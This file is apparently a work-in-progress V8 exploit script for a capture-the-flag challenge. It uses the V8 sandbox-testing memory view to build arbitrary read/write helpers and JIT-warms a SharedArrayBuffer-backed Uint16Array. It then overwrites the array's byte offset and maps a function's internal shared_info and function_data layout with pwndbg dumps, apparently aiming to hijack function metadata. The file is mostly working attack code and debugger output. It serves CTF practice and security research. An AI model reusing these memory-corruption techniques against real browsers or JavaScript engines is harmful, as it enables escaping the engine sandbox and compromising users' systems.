
/// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/gglctf-ladr-star.js 
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
return sandboxMemory.setBigInt64(Number(addr), val, true);
}


const gsab = new SharedArrayBuffer(4,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab);

/// for writing
function foo(obj, index, val){
    obj[index] = val;
    return obj[index];
}

function test(iii, val){
    return foo(u16arr, iii, val);
}

// for reading
function foo2(obj, index){
    return obj[index];
}

function test2(iii){
    return foo2(u16arr, iii);
}

for (let i = 0; i < 0x10000; i++) {
    test(1, 0);
    test2(1);
}
let byte_offset_ofs = BigInt(addrOf(u16arr) + 0x17);
v8_write64(byte_offset_ofs+4n, 0x41414141n);

/// ===================================================================================

function hax1(a, b) {
    return a + b + 1;
}

%DebugPrint(hax1);
/*
// hax1
DebugPrint: 0x2cd60029a0c9: [Function] in OldSpace
 - map: 0x2cd600281ea1 <Map[32](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x2cd600281dc9 <JSFunction (sfi = 0x2cd6001474d1)>
 - elements: 0x2cd600000725 <FixedArray[0]> [HOLEY_ELEMENTS]
 - function prototype: 
 - initial_map: 
 - shared_info: 0x2cd600299ded <SharedFunctionInfo hax1>

pwndbg> x/10wx 0x2cd60029a0c9-1
0x2cd60029a0c8:	0x00281ea1	0x00000725	0x00000725	0x0020c801
0x2cd60029a0d8:	0x00299ded	0x00299f39	0x00299f21	0x00000741
0x2cd60029a0e8:	0x00000a91	0x00299b09
/// ===================================================================================
Function + 0x10 => shared_info
pwndbg> x/20wx 0x2cd600299ded-1
0x2cd600299dec:	0x00000d39	0x00000000	0x00299e1d	0x00299b09
0x2cd600299dfc:	0x00299ba5	0x00299989	0x00030002	0x0000000d
0x2cd600299e0c:	0x00001100	0x00000008	0x00000349	0x00000000
0x2cd600299e1c:	0x0000162d	0x000000a1	0x00000427	0x00000447
0x2cd600299e2c:	0x00001cbd	0x00000004	0x00000002	0x00000010
pwndbg> job 0x2cd600299ded
0x2cd600299ded: [SharedFunctionInfo] in OldSpace
 - language_mode: sloppy
 - function_data: 0x2cd600299e1d <UncompiledDataWithoutPreparseData (1063, 1095)]>
 - code (from function_data): 0x2cd600250b5d <Code BUILTIN CompileLazy>
 - source code: (a, b) {
    return a + b + 1;
}
/// ===================================================================================
shared_info + 0x8 => function_data
pwndbg> x/20wx 0x2cd600299e1d-1
0x2cd600299e1c:	0x0000162d	0x000000a1	0x00000427	0x00000447
0x2cd600299e2c:	0x00001cbd	0x00000004	0x00000002	0x00000010
0x2cd600299e3c:	0x00004fb5	0x00008484	0x00000809	0x00000000
0x2cd600299e4c:	0x41f00000	0x00000831	0x00000002	0x00000004
0x2cd600299e5c:	0x00000000	0x00000831	0x00000002	0x41414141
/// ===================================================================================
pwndbg> job 0x2cd600299e1d
0x2cd600299e1d: [UncompiledDataWithoutPreparseData] in OldSpace
 - map: 0x2cd60000162d <Map[16](UNCOMPILED_DATA_WITHOUT_PREPARSE_DATA_TYPE)>
 - inferred_name: 0x2cd6000000a1 <String[0]: #>
 - start_position: 1063
 - end_position: 1095
*/

%SystemBreak();
let aaa = hax1()
console.log(" hax1: " + aaa);
%SystemBreak();